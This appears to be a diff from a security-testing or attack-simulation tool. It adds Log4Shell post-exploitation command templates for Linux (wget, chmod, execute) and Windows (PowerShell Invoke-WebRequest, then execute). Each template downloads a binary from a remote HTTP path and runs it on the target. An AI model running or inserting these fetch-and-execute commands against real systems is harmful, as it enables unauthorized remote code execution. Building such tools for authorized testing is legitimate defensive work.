@@ -60,4 +60,16 @@ HADOOP_LINUX_COMMAND = (
     "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"
 )
 
+LOG4SHELL_LINUX_COMMAND = (
+    "wget -O %(monkey_path)s %(http_path)s ;"
+    " chmod +x %(monkey_path)s ;"
+    " %(monkey_path)s %(monkey_type)s %(parameters)s"
+    # "touch /tmp/test_with_new"
+)
+
+LOG4SHELL_WINDOWS_COMMAND = (
+    'powershell -NoLogo -Command "'
+    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing; "
+    ' %(monkey_path)s %(monkey_type)s %(parameters)s"'
+)
 DOWNLOAD_TIMEOUT = 180
